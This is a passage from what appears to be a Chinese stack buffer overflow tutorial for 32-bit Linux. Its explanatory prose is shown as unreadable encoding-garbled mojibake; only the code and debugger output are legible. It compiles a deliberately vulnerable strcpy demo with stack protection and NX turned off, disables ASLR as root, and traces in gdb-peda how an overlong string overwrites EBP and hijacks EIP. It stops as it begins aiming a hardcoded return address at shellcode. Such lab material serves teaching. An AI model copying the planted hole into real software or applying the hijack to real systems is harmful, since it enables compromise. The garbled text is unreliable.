</code></pre><p>鍦ㄥ搴斿湴鍧€涓嬫柇鐐�</p>
<pre><code>gdb-peda$ b *0x804844b
Breakpoint 2 at 0x804844b
</code></pre><p>涓嬫鐩存帴浣跨敤<code>run(r)</code>灏卞彲浠ユ柇鍦ㄦ垜浠缃殑鏂偣澶勮€屼笉闇€瑕佷竴鐩村崟姝ヨ蛋鍒版嫹璐濇寚浠�</p>
<p><img src="Image/11.png" alt=""></p>
<p>鍐嶆潵鐪嬪鏍堢殑鎿嶄綔锛屽厛鎶珮<code>0x18</code>瀛楄妭锛屼篃灏辨槸24瀛楄妭锛岃繖涓┖闂存槸鐢ㄤ簬鏁翠釜鍑芥暟灞傞潰锛屽悗闈㈠張鎶珮<code>0x08</code>瀛楄妭锛屾帴鐫€灏嗕袱涓弬鏁板帇鏍堬紝鍚庨潰閭ｄ袱鍙ュ鏍堥《鐨勬搷浣滄晥鏋滃氨鏄皢鏍堥《鎸囬拡闄嶄綆<code>0x08</code>瀛楄妭锛屼篃灏辨槸寮瑰嚭鍙傛暟</p>
<pre><code>.text:0804843B                 push    ebp
.text:0804843C                 mov     ebp, esp
.text:0804843E                 sub     esp, 18h
.text:08048441                 sub     esp, 8          ; 鎶珮鏍堥《
.text:08048444                 push    [ebp+src]       ; src鏄浜屼釜鍙傛暟
.text:08048447                 lea     eax, [ebp+dest] ; 鑾峰彇dest瀛楃涓茬殑棣栧湴鍧€
.text:0804844A                 push    eax             ; 灏哾est浣滀负绗竴涓弬鏁板帇鏍�
.text:0804844B                 call    _strcpy         ; 璋冪敤strcpy():---&gt;strcpy(dest, src);
.text:08048450                 add     esp, 10h        ; 杩欎袱鍙ラ檷浣庢爤椤�8涓瓧鑺傦紝鐩稿綋浜庡脊鍑轰袱涓弬鏁�
.text:08048453                 sub     esp, 8
</code></pre><p>姝ゆ椂鐨勬爤甯冨眬</p>
<pre><code>[------------------------------------stack-------------------------------------]
0000| 0xbfffef00 --&gt; 0xbfffef14 --&gt; 0x2f (&#39;/&#39;)(绗竴涓弬鏁�)
0004| 0xbfffef04 --&gt; 0xbfffef44 (&quot;ABCDEFGHIJK&quot;)(绗簩涓弬鏁�)
0008| 0xbfffef08 --&gt; 0xb7fbb000 --&gt; 0x1b1db0 (杩炵潃8瀛楄妭鏄皟鐢╯trcpy鍓嶆姮楂樼殑0x08瀛楄妭)
0012| 0xbfffef0c --&gt; 0xfd57 
0016| 0xbfffef10 --&gt; 0xffffffff (绗竴娆℃姮楂樻爤椤舵椂锛孍SP鐨勪綅缃�)
0020| 0xbfffef14 --&gt; 0x2f (&#39;/&#39;)(ebp-0x14鎸囧悜杩欓噷锛屼篃灏辨槸dest瀛楃涓插叾瀹炲湴鍧€)
0024| 0xbfffef18 --&gt; 0xb7e15dc8 --&gt; 0x2b76 (&#39;v+&#39;)(绌�)
0028| 0xbfffef1c --&gt; 0xb7fd6858 --&gt; 0xb7e09000 --&gt; 0x464c457f(绌�) 
    | ......
    | 0xbfffef28 --&gt; 0xbfffef58(姝ゅ鏄疎BP锛岄偅涔坋bp-0x14=0xbfffef14)
</code></pre><p>鎵ц鎷疯礉鎸囦护</p>
<p><img src="Image/12.png" alt=""></p>
<p>瑙傚療姝ゆ椂鏍堢殑甯冨眬锛屾爤椤剁殑涓や釜鍙傛暟姝ゆ椂杩樻湭寮瑰嚭锛岀涓€涓弬鏁版寚鍚戠殑鏄洰鏍囧湴鍧€锛屽彲浠ヨ瀵熷埌姝ゆ椂宸茬粡鎷疯礉瀹屾垚</p>
<pre><code>[------------------------------------stack-------------------------------------]
0000| 0xbfffef00 --&gt; 0xbfffef14 (&quot;ABCDEFGHIJK&quot;)
0004| 0xbfffef04 --&gt; 0xbfffef44 (&quot;ABCDEFGHIJK&quot;)
0008| 0xbfffef08 --&gt; 0xb7fbb000 --&gt; 0x1b1db0 
0012| 0xbfffef0c --&gt; 0xfd57 
0016| 0xbfffef10 --&gt; 0xffffffff 
0020| 0xbfffef14 (&quot;ABCDEFGHIJK&quot;)
0024| 0xbfffef18 (&quot;EFGHIJK&quot;)
0028| 0xbfffef1c --&gt; 0x4b4a49 (&#39;IJK&#39;)
</code></pre><p>瑙傚療鏍堢殑璇︾粏鏁版嵁锛屾敞鎰忓皬绔簭鐨勯棶棰橈紝瑙傚療12涓瓧鑺傜殑瀛楃涓叉暟鎹殑浣嶇疆锛屽悓鏃舵敞鎰忓悗闈㈢殑鏁版嵁鎯呭喌</p>
<pre><code>gdb-peda$ x/12x $sp
0xbfffef00:    0xbfffef14    0xbfffef44    0xb7fbb000    0x0000fd57
0xbfffef10:    0xffffffff    0x44434241    0x48474645    0x004b4a49
0xbfffef20:    0x00008000    0xb7fbb000    0xbfffef58    0x0804849c
</code></pre><p>鏉ヤ慨鏀规垜浠殑杈撳叆瀛楃涓蹭负<code>ABCDEFGHIJKL</code></p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

void Overflow(char temp[])
{
    char buffer[12];
    strcpy(buffer, temp);
    printf(&quot;%s\n&quot;, buffer);
}

int main()
{
    char temp[13] = &quot;ABCDEFGHIJKL&quot;;
    Overflow(temp);
    return 0;
}
</code></pre><p>缂栬瘧杩愯</p>
<pre><code>wnagzihxain@toT0C:~$ gcc -fno-stack-protector -fno-builtin -o Demo Demo.c
wnagzihxain@toT0C:~$ ./Demo
ABCDEFGHIJKL
</code></pre><p>璁板綍姝ゆ椂鏍堝竷灞€</p>
<pre><code>gdb-peda$ x/12x $sp
0xbfffef00:    0xbfffef14    0xbfffef43    0xb7fbb000    0x0000fd57
0xbfffef10:    0xffffffff    0x0000002f    0xb7e15dc8    0xb7fd6858
0xbfffef20:    0x00008000    0xb7fbb000    0xbfffef58    0x080484a0
</code></pre><p>鍗曟鎵ц瀹屾嫹璐濇寚浠わ紝鍐嶆璁板綍鏍堝竷灞€</p>
<pre><code>gdb-peda$ x/120x $sp
0xbfffef00:    0x14    0xef    0xff    0xbf    0x43    0xef    0xff    0xbf
0xbfffef08:    0x00    0xb0    0xfb    0xb7    0x57    0xfd    0x00    0x00
0xbfffef10:    0xff    0xff    0xff    0xff    0x41    0x42    0x43    0x44
0xbfffef18:    0x45    0x46    0x47    0x48    0x49    0x4a    0x4b    0x4c
0xbfffef20:    0x00    0x80    0x00    0x00    0x00    0xb0    0xfb    0xb7
0xbfffef28:    0x58    0xef    0xff    0xbf    0xa0    0x84    0x04    0x08
0xbfffef30:    0x43    0xef    0xff    0xbf    0x00    0x00    0x00    0x00
0xbfffef38:    0x50    0x7a    0xe3    0xb7    0xfb    0x84    0x04    0x08
0xbfffef40:    0x01    0x00    0x00    0x41    0x42    0x43    0x44    0x45
0xbfffef48:    0x46    0x47    0x48    0x49    0x4a    0x4b    0x4c    0x00
0xbfffef50:    0xdc    0xb3    0xfb    0xb7    0x70    0xef    0xff    0xbf
0xbfffef58:    0x00    0x00    0x00    0x00    0x37    0x16    0xe2    0xb7
0xbfffef60:    0x00    0xb0    0xfb    0xb7    0x00    0xb0    0xfb    0xb7
0xbfffef68:    0x00    0x00    0x00    0x00    0x37    0x16    0xe2    0xb7
0xbfffef70:    0x01    0x00    0x00    0x00    0x04    0xf0    0xff    0xbf\
</code></pre><p>鐢变簬涓€鍦板潃鐨勬暟鎹槸<code>0x00</code>锛屾垜浠皾璇曞姞涓€瀛楄妭鐨勬暟鎹�</p>
<pre><code>char temp[14] = &quot;ABCDEFGHIJKLM&quot;;
</code></pre><p>缂栬瘧杩愯</p>
<pre><code>wnagzihxain@toT0C:~$ gcc -fno-stack-protector -fno-builtin -o Demo Demo.c
wnagzihxain@toT0C:~$ ./Demo
ABCDEFGHIJKLM
</code></pre><p>璁板綍鏍堝竷灞€锛岃繖閲屼竴瀹氳鏈璋冭瘯鐨勬暟鎹紝铏界劧涓€鑸儏鍐典笅涓嶄細鍙橈紝浣嗘槸涓轰簡纭繚涓囨棤涓€澶憋紝杩樻槸淇濊瘉姣忔鐨勬暟鎹兘鏄柊椴滅殑濂�</p>
<pre><code>gdb-peda$ x/12x $sp
0xbfffef00:    0xbfffef14    0xbfffef42    0xb7fbb000    0x0000fd57
0xbfffef10:    0xffffffff    0x0000002f    0xb7e15dc8    0xb7fd6858
0xbfffef20:    0x00008000    0xb7fbb000    0xbfffef58    0x080484a2
</code></pre><p>鎵ц瀹屾嫹璐濇寚浠わ紝璁板綍鏍堝竷灞€</p>
<pre><code>gdb-peda$ x/120x $sp
0xbfffef00:    0x14    0xef    0xff    0xbf    0x42    0xef    0xff    0xbf
0xbfffef08:    0x00    0xb0    0xfb    0xb7    0x57    0xfd    0x00    0x00
0xbfffef10:    0xff    0xff    0xff    0xff    0x41    0x42    0x43    0x44
0xbfffef18:    0x45    0x46    0x47    0x48    0x49    0x4a    0x4b    0x4c
0xbfffef20:    0x4d    0x00    0x00    0x00    0x00    0xb0    0xfb    0xb7
0xbfffef28:    0x58    0xef    0xff    0xbf    0xa2    0x84    0x04    0x08
0xbfffef30:    0x42    0xef    0xff    0xbf    0x00    0x00    0x00    0x00
0xbfffef38:    0x50    0x7a    0xe3    0xb7    0x0b    0x85    0x04    0x08
0xbfffef40:    0x01    0x00    0x41    0x42    0x43    0x44    0x45    0x46
0xbfffef48:    0x47    0x48    0x49    0x4a    0x4b    0x4c    0x4d    0x00
0xbfffef50:    0xdc    0xb3    0xfb    0xb7    0x70    0xef    0xff    0xbf
0xbfffef58:    0x00    0x00    0x00    0x00    0x37    0x16    0xe2    0xb7
0xbfffef60:    0x00    0xb0    0xfb    0xb7    0x00    0xb0    0xfb    0xb7
0xbfffef68:    0x00    0x00    0x00    0x00    0x37    0x16    0xe2    0xb7
0xbfffef70:    0x01    0x00    0x00    0x00    0x04    0xf0    0xff    0xbf
</code></pre><p>娉ㄦ剰杩欓噷锛屾垜浠渶鍚庝竴涓瓧姣�<code>M</code>宸茬粡鍐欏叆鎴戜滑娼滄剰璇嗛噷瀹氫箟鐨勬爤绌洪棿澶栵紝浣嗘槸鐢变簬杩欓噷灞炰簬鎴戜滑鎶珮鐨勫悎娉曟爤绌洪棿锛屽苟涓嶄細瀵瑰悗缁寚浠ゆ墽琛岄€犳垚褰卞搷</p>
<pre><code>0xbfffef20:    0x4d    0x00    0x00    0x00
</code></pre><p>鎴戜滑鍙互缁х画鎵ц锛屽苟娌℃湁鍑洪敊</p>
<pre><code>gdb-peda$ c
Continuing.
ABCDEFGHIJKLM
[Inferior 1 (process 2760) exited normally]
Warning: not running or target is remote
</code></pre><p>杩欓噷瀵逛簬瀛楃涓插垎閰嶇殑绌洪棿鏄�<code>0x14</code>瀛楄妭锛屼篃灏辨槸20瀛楄妭锛屽悓鏍锋垜浠湪涓婇潰鐨勬爤甯冨眬涓瀵熷嚭鏉ワ紝鍙渶瑕�20涓瓧鑺傜殑瀛楃涓插嵆鍙奖鍝岴BP鐨勬暟鎹紝鏈€鍚庤繕鏈変釜<code>\0</code>锛屾垜浠嬁鏈€鍚庤繖涓埅鏂鏉ヤ慨鏀笶BP</p>
<pre><code>char temp[21] = &quot;ABCDEFGHIJKLMNOPQRST&quot;;
</code></pre><p>缂栬瘧杩愯锛岀湅鏉ュ緢鏈夊彲鑳芥槸鎴戜滑鏈€鍚庨偅涓埅鏂淇敼浜咵BP閫犳垚浜嗘爤鐨勪笉骞宠　</p>
<pre><code>wnagzihxain@toT0C:~$ gcc -fno-stack-protector -fno-builtin -o Demo Demo.c
wnagzihxain@toT0C:~$ ./Demo
ABCDEFGHIJKLMNOPQRST
娈甸敊璇� (鏍稿績宸茶浆鍌�)
</code></pre><p>鎵ц鎷疯礉鍓嶈褰曟爤甯冨眬</p>
<pre><code>gdb-peda$ x/32x $sp
0xbfffeef0:    0xbfffef04    0xbfffef3b    0xbfffef10    0x08048254
0xbfffef00:    0x00000000    0xbfffefa4    0xb7fbb000    0x0000fd57
0xbfffef10:    0xffffffff    0x0000002f    0xbfffef58    0x080484ae
0xbfffef20:    0xbfffef3b    0xb7fbb000    0xb7fb9244    0xb7e210ec
0xbfffef30:    0x00000001    0x00000000    0x41e37a50    0x45444342
0xbfffef40:    0x49484746    0x4d4c4b4a    0x51504f4e    0x00545352
0xbfffef50:    0xb7fbb3dc    0xbfffef70    0x00000000    0xb7e21637
0xbfffef60:    0xb7fbb000    0xb7fbb000    0x00000000    0xb7e21637
</code></pre><p>鎵ц瀹屾嫹璐濇寚浠わ紝璁板綍鏍堝竷灞€</p>
<pre><code>gdb-peda$ x/120x $sp
0xbfffeef0:    0x04    0xef    0xff    0xbf    0x3b    0xef    0xff    0xbf
0xbfffeef8:    0x10    0xef    0xff    0xbf    0x54    0x82    0x04    0x08
0xbfffef00:    0x00    0x00    0x00    0x00    0x41    0x42    0x43    0x44
0xbfffef08:    0x45    0x46    0x47    0x48    0x49    0x4a    0x4b    0x4c
0xbfffef10:    0x4d    0x4e    0x4f    0x50    0x51    0x52    0x53    0x54
0xbfffef18:    0x00    0xef    0xff    0xbf    0xae    0x84    0x04    0x08
0xbfffef20:    0x3b    0xef    0xff    0xbf    0x00    0xb0    0xfb    0xb7
0xbfffef28:    0x44    0x92    0xfb    0xb7    0xec    0x10    0xe2    0xb7
0xbfffef30:    0x01    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xbfffef38:    0x50    0x7a    0xe3    0x41    0x42    0x43    0x44    0x45
0xbfffef40:    0x46    0x47    0x48    0x49    0x4a    0x4b    0x4c    0x4d
0xbfffef48:    0x4e    0x4f    0x50    0x51    0x52    0x53    0x54    0x00
0xbfffef50:    0xdc    0xb3    0xfb    0xb7    0x70    0xef    0xff    0xbf
0xbfffef58:    0x00    0x00    0x00    0x00    0x37    0x16    0xe2    0xb7
0xbfffef60:    0x00    0xb0    0xfb    0xb7    0x00    0xb0    0xfb    0xb7
</code></pre><p>鐢变簬瀛楃涓插彉闀匡紝EBP涔熻鐩稿簲鐨勫彉鍖栵紝锛屽悓鏃跺瓧绗︿覆鐨勫湴鍧€涔熼兘浼氬彉鍖栵紝鎵ц鍓嶅悗鐨凟BP瀵规瘮锛岀敱浜庢槸灏忕搴忥紝绗竴涓瓧鑺傝瀛楃涓茬殑鎴柇绗﹁鐩栦簡</p>
<pre><code>EBP: 0xbfffef18 --&gt; 0xbfffef58 --&gt; 0x0
EBP: 0xbfffef18 --&gt; 0xbfffef00 --&gt; 0x0
</code></pre><p>鍏抽敭鐨勫唴瀛樻暟鎹紝<code>0xbfffef18</code>鏄疎BP</p>
<pre><code>0xbfffef00:    0x00    0x00    0x00    0x00    0x41    0x42    0x43    0x44
0xbfffef08:    0x45    0x46    0x47    0x48    0x49    0x4a    0x4b    0x4c
0xbfffef10:    0x4d    0x4e    0x4f    0x50    0x51    0x52    0x53    0x54
0xbfffef18:    0x00    0xef    0xff    0xbf
</code></pre><p>鑷充簬閭ｇ<code>41414141</code>锛屽洜涓�<code>RETN</code>鍦‥BP鐨勫悗闈紝鎴戜滑鍙渶瑕佸濉厖涓€浜涙暟鎹紝瑕嗙洊浜�<code>RETN</code>锛屽氨鍙互鎺у埗EIP锛屾垜浠繖閲屼娇鐢ㄧ殑鏄�<code>AAAA</code>锛屾墍浠ユ鏃剁殑EIP琚垜浠姭鎸佸埌浜�<code>0x41414141</code>锛岃繖涓湴鍧€涓婅偗瀹氭槸娌℃湁鎸囦护鐨勶紝gdb+peda甯垜浠崟鑾峰埌浜嗚繖涓紓甯稿苟涓旇緭鍑轰簡涓€浜涙瘮杈冨叧閿殑宕╂簝鐜板満鐨勬暟鎹紝鍚屾椂鎴戜滑涔熷彲浠ユ墜鍔ㄨ繘琛屼竴浜涘穿婧冪幇鍦烘暟鎹殑鎻愬彇锛屾瘮濡�<code>bt</code>锛岀敤浜庡爢鏍堝洖婧紝鏌ョ湅璋冪敤鏍堬紝杩樻湁鍫嗘爤鐨勬暟鎹瓑</p>
<p><img src="Image/13.png" alt=""></p>
<h2 id="0x03-shellcode-">0x03 Shellcode缂栧啓</h2>
<p>浜岃繘鍒舵敾闃插彂灞曞埌鐜板湪杩欎釜闃舵锛屽凡缁忔湁鍚勭閽堝婕忔礊鐨勭紦瑙ｆ満鍒讹紝鎵€浠ュ湪鎵惧埌浜嗘紡娲炲悗锛岀粫杩囪繖浜涚紦瑙ｆ満鍒朵篃鏄竴涓叧閿殑鐜妭锛屾瘮濡侺inux鐨凜ANARY鍜學indows鐨凣S锛孡inux鍜學indows閮芥湁鐨凙SLR锛孡inux鐨凬X鍜學indows鐨凞EP</p>
<p>棣栧厛浣跨敤<code>checksec</code>鏌ョ湅绋嬪簭寮€鐨勪繚鎶ゆ満鍒�</p>
<pre><code>gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
</code></pre><p>涓€涓釜鏉ヨ璁诧紝鎺ヤ笅鏉ラ兘鏄悊璁猴紝铏界劧鎴戜篃涓嶆槸寰堝枩娆㈢悊璁虹殑涓滆タ</p>
<p>杩欓儴鍒嗚缁嗙殑鎻忚堪鍙互鍦ㄣ€夾ndroid瀹夊叏鏀婚槻鏉冨▉鎸囧崡銆嬫壘鍒帮紝澶у鍠滄鐨勮瘽鍙互鍘绘壘鎵撅紝閭ｆ湰涔︿篃涓嶉敊锛屾帹鑽愰槄璇�</p>
<p><strong>ASLR</strong>锛氬叏绉癆ddress Space Layout Randomization锛岀▼搴忚繍琛岀殑鏃跺€欙紝鍐呭瓨鍦板潃涓嶅浐瀹氾紝姣忔閮戒笉涓€鏍凤紝铏界劧涓婇潰鎴戜滑浣跨敤gdb鍔ㄦ€佽皟璇曠殑鏃跺€欑湅鍒扮殑閮芥槸鍥哄畾鐨勶紝閭ｆ槸鍥犱负gdb鍦ㄨ皟璇曠殑鏃跺€欎細鍏虫帀ASLR锛屼竴鑸郴缁熼兘鏄紑浜�</p>
<p>鏌ョ湅寮€娌″紑ASLR锛屽彲鑳芥湁鍚屽鍙惉杩�0鍜�1锛�2鏄粈涔堟剰鎬濓紵鍋氬ソ蹇冪悊鍑嗗锛�<strong>澧炲己鐗圓SLR</strong></p>
<pre><code>root@toT0C:/home/wnagzihxain# cat /proc/sys/kernel/randomize_va_space
2
</code></pre><p>鎴戜滑root妯″紡涓嬪叧鎺夊畠锛屽氨鏄繖涔堟畫鏆�</p>
<pre><code>root@toT0C:/home/wnagzihxain# echo 0 &gt; /proc/sys/kernel/randomize_va_space
root@toT0C:/home/wnagzihxain# cat /proc/sys/kernel/randomize_va_space
0
</code></pre><p><strong>CANARY</strong>锛氱被浼糤indows涓嬬殑GS锛屽湪璋冪敤鍑芥暟鏃讹紝浼氬厛鐢熸垚涓€涓狢ookie锛屼竴涓繚瀛樺湪鍐呭瓨涓煇澶勶紝涓€涓彃鍏ユ爤涓紝婧㈠嚭鐨勬椂鍊欎細瑕嗙洊鎺夎繖涓狢ookie锛屽嚱鏁拌繑鍥炵殑鏃跺€欎細鍙栧嚭瀛樺湪鏌愬鐨凜ookie瀵规瘮鏍堜腑鐨凜ookie锛屼笉涓€鏍疯〃绀烘孩鍑�</p>
<p>鐜板湪鏈夊洓绉嶆ā寮忓彲浠ラ€夋嫨</p>
<pre><code>gcc -fno-stack-protector -o Demo Demo.c  //绂佺敤鍫嗘爤淇濇姢
gcc -fstack-protector -o Demo Demo.c     //鍚敤鍫嗘爤淇濇姢锛岄拡瀵规湁瀛楃涓叉暟缁勭殑鍑芥暟
gcc -fstack-protector-all -o Demo Demo.c //鍚敤鍫嗘爤淇濇姢锛岄拡瀵规墍鏈夊嚱鏁�
gcc -fstack-protector-strong -o Demo Demo.c //鏇村己鐗堟湰
</code></pre><p>涓€寮€濮嬬紪璇戠殑鏃跺€欑洿鎺ユ妸瀹冨叧浜嗭紝濂忔槸杩欎箞鍑戜笉瑕佽劯:)</p>
<p><strong>FORTIFY</strong>锛欶ORTIFY_SOURCE锛屽寮烘簮鐮侊紝鐩墠鏈変袱绉嶇瓑绾э紝1鍜�2锛岀紪璇戞椂鍔犱笂-D_FORTIFY_SOURCE=1鎴栬€�2鍗冲彲寮€鍚紝濡傛灉瀹忎负1锛屽垯鍦ㄦ湁strcpy鍑芥暟鐨勬寚浠ゅ懆鍥村姞涓婃鏌ョ紦鍐插尯鍜屽緟鎷疯礉瀛楃涓查暱搴︾浉鍏崇殑鎸囦护锛屽鏋滃畯涓�2锛岃繕浼氭湁鍖呮嫭浣嗕笉浠呭彧鏈夋牸寮忓寲瀛楃涓叉紡娲炵殑妫€鏌�</p>
<p><strong>NX</strong>锛歂o eXecute锛學indows涓嬪彨DEP锛岄粯璁ゅ紑鍚紝浼氬皢鏁版嵁鎵€鍦ㄧ殑鍐呭瓨椤佃缃负涓嶅彲鎵ц锛屽綋鎴戜滑婊戝埌Shellcode鍖猴紝鎵ц鐨勪负鏁版嵁鍖猴紝涓嶅彲鎵ц锛屽氨浼氳Е鍙戝紓甯革紝涔熷氨鏄鐩存帴璁╂暟鎹尯鐨凷hellcode澶辨晥</p>
<p>鍏抽棴瀹冿紝瀵癸紝鎴戜滑灏辨槸瑕佸叧鍏冲叧</p>
<pre><code>wnagzihxain@toT0C:~$ gcc -fno-stack-protector -fno-builtin -zexecstack -o Demo Demo.c
</code></pre><p>鏌ョ湅淇濇姢鎺柦锛屽凡缁忓Ε濡ョ殑鍏充簡</p>
<pre><code>gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
</code></pre><p><strong>PIE</strong>锛歅osition-Independent Executable锛孡inux涓嬪紑鍦板潃闅忔満鍖栨槸瑕佷笉灏戝紑閿€鐨�</p>
<p><strong>RELRO</strong>锛歊ELocation Read-Only锛屽畼鏂硅娉曟槸璁剧疆绗﹀彿閲嶅畾鍚戣〃鏍间负鍙鎴栧湪绋嬪簭鍚姩鏃跺氨瑙ｆ瀽骞剁粦瀹氭墍鏈夊姩鎬佺鍙凤紝浠庤€屽噺灏戝GOT(Global Offset Table)鏀诲嚮</p>
<p>浠ヤ笂鏄鐩墠Linux涓婁竴浜涙瘮杈冧富娴佺殑婕忔礊缂撹В鏈哄埗鐨勭畝鍗曚粙缁嶏紝鎺ヤ笅鏉ユ垜浠潵鎬濊€冨浣曟瀯寤篍XP</p>
<p>ASLR宸茬粡鍏充簡锛屾墍浠ュ湪杩欓噷鎴戜滑鍙互浣跨敤纭紪鐮佺殑鏂瑰紡</p>
<p>娌℃孩鍑烘儏鍐典笅锛屾墽琛屽畬鎷疯礉鎸囦护锛屾垜浠殑鏍堝竷灞€濡備笅</p>
<pre><code>gdb-peda$ stack 20
0000| 0xbfffef00 --&gt; 0xbfffef14 (&quot;AAAA&quot;)
0004| 0xbfffef04 --&gt; 0xbfffef44 (&quot;AAAA&quot;)
0008| 0xbfffef08 --&gt; 0xb7fbb000 --&gt; 0x1b1db0 
0012| 0xbfffef0c --&gt; 0xfd57 
0016| 0xbfffef10 --&gt; 0xffffffff 
0020| 0xbfffef14 (&quot;AAAA&quot;)
0024| 0xbfffef18 --&gt; 0xb7e15d00 --&gt; 0x19b 
0028| 0xbfffef1c --&gt; 0xb7fd6858 --&gt; 0xb7e09000 --&gt; 0x464c457f 
0032| 0xbfffef20 --&gt; 0x8000 
0036| 0xbfffef24 --&gt; 0xb7fbb000 --&gt; 0x1b1db0 
0040| 0xbfffef28 --&gt; 0xbfffef58 --&gt; 0x0 
0044| 0xbfffef2c --&gt; 0x804849c (&lt;main+50&gt;:    add    esp,0x10)
0048| 0xbfffef30 --&gt; 0xbfffef44 (&quot;AAAA&quot;)
0052| 0xbfffef34 --&gt; 0x0 
0056| 0xbfffef38 --&gt; 0xb7e37a50 (&lt;__new_exitfn+16&gt;:    add    ebx,0x1835b0)
0060| 0xbfffef3c --&gt; 0x80484fb (&lt;__libc_csu_init+75&gt;:    add    edi,0x1)
0064| 0xbfffef40 --&gt; 0x1 
0068| 0xbfffef44 (&quot;AAAA&quot;)
0072| 0xbfffef48 --&gt; 0x0 
0076| 0xbfffef4c --&gt; 0x0
</code></pre><p>姝ゆ椂鎴戜滑鐨凟BP鏄�<code>0xbfffef28</code></p>
<pre><code>EBP: 0xbfffef28 --&gt; 0xbfffef58 --&gt; 0x0
</code></pre><p>鎺ヤ笅鏉ュ埌<code>leave</code>鍓嶇殑鎸囦护浼氬皢鏍堥《闄嶄綆<code>0x10</code>瀛楄妭</p>
<pre><code>gdb-peda$ stack 10
0000| 0xbfffef10 --&gt; 0xffffffff 
0004| 0xbfffef14 (&quot;AAAA&quot;)
0008| 0xbfffef18 --&gt; 0xb7e15d00 --&gt; 0x19b 
0012| 0xbfffef1c --&gt; 0xb7fd6858 --&gt; 0xb7e09000 --&gt; 0x464c457f 
0016| 0xbfffef20 --&gt; 0x8000 
0020| 0xbfffef24 --&gt; 0xb7fbb000 --&gt; 0x1b1db0 
0024| 0xbfffef28 --&gt; 0xbfffef58 --&gt; 0x0 
0028| 0xbfffef2c --&gt; 0x804849c (&lt;main+50&gt;:    add    esp,0x10)
0032| 0xbfffef30 --&gt; 0xbfffef44 (&quot;AAAA&quot;)
0036| 0xbfffef34 --&gt; 0x0
</code></pre><p><code>leave</code>鎸囦护绛夋晥浜�</p>
<pre><code>mov esp, ebp
pop ebp
</code></pre><p>鍏堟妸EBP璧嬪€肩粰ESP锛岃繖鏍峰綋鍓嶇殑ESP灏辨寚鍚�<code>0xbfffef28</code>锛屽湪灏咵SP鎸囧悜鐨勫€煎脊缁橢BP锛岃繖涓寚鍚戠殑鍊间负鍓嶄竴鍑芥暟鐨凟BP锛屽悓鏃�<code>pop</code>鎸囦护闄嶄綆浜�<code>0x04</code>瀛楄妭鐨勬爤椤�</p>
<pre><code>gdb-peda$ stack 10
0000| 0xbfffef2c --&gt; 0x804849c (&lt;main+50&gt;:    add    esp,0x10)
0004| 0xbfffef30 --&gt; 0xbfffef44 (&quot;AAAA&quot;)
0008| 0xbfffef34 --&gt; 0x0 
0012| 0xbfffef38 --&gt; 0xb7e37a50 (&lt;__new_exitfn+16&gt;:    add    ebx,0x1835b0)
0016| 0xbfffef3c --&gt; 0x80484fb (&lt;__libc_csu_init+75&gt;:    add    edi,0x1)
0020| 0xbfffef40 --&gt; 0x1 
0024| 0xbfffef44 (&quot;AAAA&quot;)
0028| 0xbfffef48 --&gt; 0x0 
0032| 0xbfffef4c --&gt; 0x0 
0036| 0xbfffef50 --&gt; 0xb7fbb3dc --&gt; 0xb7fbc1e0 --&gt; 0x0
</code></pre><p>姝ゆ椂鍙渶瑕佹墽琛�<code>RETN</code>鍗冲彲瀹屾垚鍑芥暟鐨勮繑鍥烇紝杩斿洖鐨勫湴鍧€涓篍SP鎸囧悜鐨勫湴鍧€</p>
<pre><code>0000| 0xbfffef2c --&gt; 0x804849c (&lt;main+50&gt;:    add    esp,0x10)
</code></pre><p>鍗曟鎵ц锛岃烦鍥�<code>main()</code>鍑芥暟棰嗙┖</p>
<pre><code>[-------------------------------------code-------------------------------------]
   0x8048493 &lt;main+41&gt;:    lea    eax,[ebp-0x14]
   0x8048496 &lt;main+44&gt;:    push   eax
   0x8048497 &lt;main+45&gt;:    call   0x804843b &lt;Overflow&gt;
=&gt; 0x804849c &lt;main+50&gt;:    add    esp,0x10
   0x804849f &lt;main+53&gt;:    mov    eax,0x0
   0x80484a4 &lt;main+58&gt;:    mov    ecx,DWORD PTR [ebp-0x4]
   0x80484a7 &lt;main+61&gt;:    leave  
   0x80484a8 &lt;main+62&gt;:    lea    esp,[ecx-0x4]
</code></pre><p>鍚屾椂娉ㄦ剰鏍堝彉鍖栵紝<code>0x04</code>瀛楄妭鐨勬暟鎹寮瑰嚭锛屽脊鍒癊IP瀵勫瓨鍣�</p>
<pre><code>[------------------------------------stack-------------------------------------]
0000| 0xbfffef30 --&gt; 0xbfffef44 (&quot;AAAA&quot;)
0004| 0xbfffef34 --&gt; 0x0 
0008| 0xbfffef38 --&gt; 0xb7e37a50 (&lt;__new_exitfn+16&gt;:    add    ebx,0x1835b0)
0012| 0xbfffef3c --&gt; 0x80484fb (&lt;__libc_csu_init+75&gt;:    add    edi,0x1)
0016| 0xbfffef40 --&gt; 0x1 
0020| 0xbfffef44 (&quot;AAAA&quot;)
0024| 0xbfffef48 --&gt; 0x0 
0028| 0xbfffef4c --&gt; 0x0
</code></pre><p>瀵逛簬绋嬪簭鐨勮繑鍥炶繃绋嬶紝鎴戜滑宸茬粡寮勬竻妤氫簡锛岀粨鍚堜笂闈㈢殑婧㈠嚭鍒嗘瀽锛屽綋鎴戜滑鐨勬暟鎹鐩栦簡EBP鍚庨潰4瀛楄妭鏁版嵁锛岃繖涓綅缃篃鍙綔杩斿洖鍦板潃鎴栬€匛IP</p>
<p>閭ｄ箞濡傛灉鎴戜滑纭紪鐮佷竴涓湴鍧€锛岃繖涓湴鍧€鎸囧悜鎴戜滑杈撳叆鏁版嵁鐨勯鍦板潃锛屽畠浼氫笉浼氳烦杩囧幓鍛紵</p>
<p>姝ゆ椂ASLR宸插叧闂紝鍙互纭紪鐮侊紝棣栧厛鎴戜滑鎶婂墠闈㈢殑绌洪棿鍏ㄩ兘濉厖浜嗭紝鍖呮嫭EBP涔熼兘濉厖<code>A</code>锛岀劧鍚庡湪杩斿洖鍦板潃濉厖缂撳啿鍖洪噷瀛楃涓查鍦板潃锛岃娉ㄦ剰灏忕搴忕殑闂</p>
